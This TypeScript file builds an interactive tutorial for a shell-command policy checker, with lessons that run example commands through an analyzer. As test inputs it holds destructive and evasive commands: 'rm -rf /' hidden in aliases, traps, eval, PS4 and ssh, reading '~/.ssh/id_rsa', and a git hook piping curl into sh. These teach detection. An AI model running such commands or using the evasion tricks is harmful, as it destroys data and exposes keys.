import type { Environment, Policy } from '#src/index.ts';
import {
  attempt,
  editor,
  esc,
  evaluateEnvironment,
  evaluatePolicy,
  frame,
  highlightJs,
  mountChrome,
  playground,
  virtualFs,
} from './term.ts';
import './style.css';

interface Lesson {
  readonly command: string;
  readonly examples?: readonly string[];
  /** A policy to edit, as JavaScript; `recommended` when not given. */
  readonly policy?: string;
  /** An environment to edit, as JavaScript. */
  readonly environment?: string;
  /** Files to edit, by absolute path: the filesystem the analysis reads. */
  readonly files?: Readonly<Record<string, string>>;
}

const LESSONS: Readonly<Record<string, Lesson>> = {
  check: {
    command: 'git status',
    examples: ['git status && rm -rf /', 'rg TODO src | head', 'git log --oneline -5', 'npm test', 'curl -s example.com'],
  },
  invocations: {
    command: 'sudo env FOO=1 bash -c "rm -rf /"',
    examples: ['ls | xargs -n1 wc -l', 'timeout 5 nice -n 10 git fetch', 'echo "$(whoami)" > me.txt', 'find . -name "*.tmp" -delete'],
  },
  options: {
    command: 'rm -fr /',
    examples: ['rm --recursive --force /', 'rm -r -f -- /', 'git push origin +main', 'git push --force-w origin main', 'git push --forc'],
  },
  dynamic: {
    command: 'rm -rf "$dir"',
    policy: '{ ...recommended, strict: false }',
    examples: ['dir=/; rm -rf "$dir"', 'dir=build; rm -rf "$dir"', 'xargs rm -rf < list', 'cd /; rm -rf *'],
  },
  state: {
    command: 'x=rm\nf() { $x -rf ~; }\nf',
    examples: [
      'shopt -s expand_aliases\nalias ls="rm -rf /"\nls',
      'shopt -s expand_aliases; alias ls="rm -rf /"; ls',
      'hash -p /bin/rm ls; ls -rf /',
      'for d in src /; do rm -rf "$d"; done',
      'PATH=./bin:$PATH; ls',
    ],
  },
  strings: {
    command: "trap 'rm -rf ~' EXIT\nls",
    examples: ["eval 'rm -rf /'", 'ssh host "rm -rf /"', "PS4='$(rm -rf /)'; set -x; ls", 'bash -c "$cmd"', "zsh -c 'rm -rf /'"],
  },
  rules: {
    command: 'git log --oneline | head',
    policy: `{
  default: 'ask',
  rules: [
    allow('git status|log|diff|show'),
    allow('ls|cat|rg|head'),
    deny('git push', { options: ['--force'], reason: 'No force pushes' }),
    ask({ effects: ['network'] }),
  ],
}`,
    examples: ['ls -la | wc -l', 'git push -f origin main', 'git push origin main', 'cat ~/.ssh/id_rsa'],
  },
  paths: {
    command: 'echo hi > notes.txt',
    environment: `{
  cwd: '/home/me/project',
  env: { HOME: '/home/me' },
}`,
    examples: [
      'cd .. && echo hi > notes.txt',
      'echo hi > /home/me/project/src/a.txt',
      'echo x >> /home/me/.bashrc',
      'cp config.json /etc/app/',
      'tee ../out.log < input',
    ],
  },
  files: {
    command: 'git commit -m wip',
    environment: "{ cwd: '/repo' }",
    files: {
      '/repo/.git/config': '[core]\n\tbare = false\n',
      '/repo/.git/hooks/pre-commit': '#!/bin/sh\ncurl -s https://example.com/lint.sh | sh\n',
      '/repo/package.json': '{\n  "scripts": {\n    "test": "node test.js && rm -rf ~"\n  }\n}\n',
    },
    examples: ['git commit -m wip', 'npm test', 'git st', 'git push origin main'],
  },
};

mountChrome('tutorial.html');

for (const code of document.querySelectorAll('pre.code[data-lang="ts"]')) code.innerHTML = highlightJs(code.textContent);

for (const slot of document.querySelectorAll<HTMLElement>('[data-lesson]')) {
  const id = slot.dataset.lesson!;
  const lesson = LESSONS[id];
  if (lesson) slot.replaceWith(mount(id, lesson));
}

function mount(id: string, lesson: Lesson) {
  const body = document.createElement('div');
  const panes = document.createElement('div');
  panes.className = 'panes';

  let policy: Policy | Error = attempt(() => evaluatePolicy(lesson.policy ?? 'recommended'));
  let environment: Environment | Error = attempt(() => evaluateEnvironment(lesson.environment ?? '{}'));
  const files: Record<string, string> = { ...lesson.files };
  const withFs = () => (environment instanceof Error || !lesson.files ? environment : { ...environment, fs: virtualFs(files) });

  const term = playground({ command: lesson.command, policy: () => policy, environment: withFs });

  const pane = (label: string, value: string, render: (text: string) => string, onInput: (text: string) => void) => {
    const root = document.createElement('div');
    root.className = 'pane';
    const edit = editor({
      value,
      label,
      render,
      onInput(text) {
        onInput(text);
        term.rerun();
      },
    });
    root.innerHTML = `<span class="pane-label">${esc(label)}</span>`;
    root.append(edit.root);
    panes.append(root);
  };
  if (lesson.policy !== undefined) {
    pane('policy.ts', lesson.policy, highlightJs, (text) => {
      policy = attempt(() => evaluatePolicy(text));
    });
  }
  if (lesson.environment !== undefined) {
    pane('environment.ts', lesson.environment, highlightJs, (text) => {
      environment = attempt(() => evaluateEnvironment(text));
    });
  }
  for (const [path, text] of Object.entries(files)) {
    pane(path, text, esc, (value) => {
      files[path] = value;
    });
  }

  if (panes.childElementCount > 0) body.append(panes);
  body.append(term.root);

  if (lesson.examples) {
    const examples = document.createElement('p');
    examples.className = 'examples';
    examples.innerHTML = '<span class="dim">try:</span>';
    for (const example of [lesson.command, ...lesson.examples.filter((e) => e !== lesson.command)]) {
      const button = document.createElement('button');
      button.type = 'button';
      button.textContent = example.replace(/\n/g, ' ⏎ ');
      button.addEventListener('click', () => term.input.set(example));
      examples.append(button);
    }
    body.append(examples);
  }

  const title = lesson.policy === undefined ? 'policy: recommended' : 'policy: policy.ts';
  return frame(`lesson-${id} — ${title}`, body);
}

// The index: one entry per lesson, the one being read marked.
const sections = [...document.querySelectorAll<HTMLElement>('.lesson')];
const toc = document.querySelector('.toc ol')!;
for (const [index, section] of sections.entries()) {
  const item = document.createElement('li');
  item.innerHTML = `<a href="#${section.id}">${String(index + 1).padStart(2, '0')}-${section.id}</a>`;
  toc.append(item);
}
const links = [...toc.querySelectorAll('a')];

let frameId = 0;
function follow() {
  frameId = 0;
  const atEnd = innerHeight + scrollY >= document.documentElement.scrollHeight - 2;
  const passed = sections.filter((s) => s.getBoundingClientRect().top <= innerHeight / 3);
  const active = (atEnd ? sections : passed).at(-1)?.id;
  for (const link of links) {
    if (link.hash === `#${active}`) link.setAttribute('aria-current', 'location');
    else link.removeAttribute('aria-current');
  }
}
const schedule = () => {
  frameId ||= requestAnimationFrame(follow);
};
addEventListener('scroll', schedule, { passive: true });
addEventListener('resize', schedule);
follow();
